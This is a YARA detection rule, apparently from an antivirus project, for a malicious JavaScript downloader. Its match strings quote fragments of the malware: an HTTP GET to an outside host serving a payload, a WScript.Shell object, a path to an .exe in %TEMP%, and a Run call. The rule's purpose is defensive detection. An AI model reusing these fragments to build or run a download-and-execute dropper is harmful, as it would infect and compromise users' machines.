rule sig_20160330_125838d7069c744acb611afa3aadc480 {
  meta:
    description = "datamaliciousorder - file 20160330_125838d7069c744acb611afa3aadc480.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "54490b3043110b4aec26fd8a52c9b2629828a928fa2ec7fa88c49b870c16081f"

  strings:
    $s1  = "_L[_SV](\"GET\", \"http://dev.orolatina.com/s3isk\", false);" fullword ascii
    $s2  = "var _FP = function _RP() {return WScript[_Z0](\"WScript\"+\".Shell\");}(), _F = 11;" fullword ascii
    $s3  = "function _MS(_P0, _AL){_P = _P * 1; return _P0 - _AL;};" fullword ascii
    $s4  = "if (_L[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _SE() {return _FP[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"JHdjk20pqz.ex\" + \"e\";};" fullword ascii
    $s6  = "function _M(){return _TW + \"\";};" fullword ascii
    $s7  = "function _FF() {return ((_Q == true) && (_Q == _W)) ? 1 : _P;};" fullword ascii
    $s8  = "function _A0(_O){_FP[\"Run\"](_O, _P, _P);};" fullword ascii
    $s9  = "function _K(){return _Z0;};" fullword ascii
    $s10 = " while (_LO){" fullword ascii
    $s11 = "function _A()" fullword ascii
    $s12 = "function _OD(){return 22;};" fullword ascii
    $s13 = "function _Z(_G) {var _T = (1, 2, 3, 4, 5, _G); return _T;};" fullword ascii
    $s14 = "return _MS(_GH, _UC);" fullword ascii
    $s15 = "var _PT = new this[\"Date\"]();" fullword ascii
    $s16 = "_Q = true; " fullword ascii
    $s17 = "_W = true; " fullword ascii
    $s18 = "var _Q = false;" fullword ascii
    $s19 = "var _I = false;" fullword ascii
    $s20 = "} catch(_G0){};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}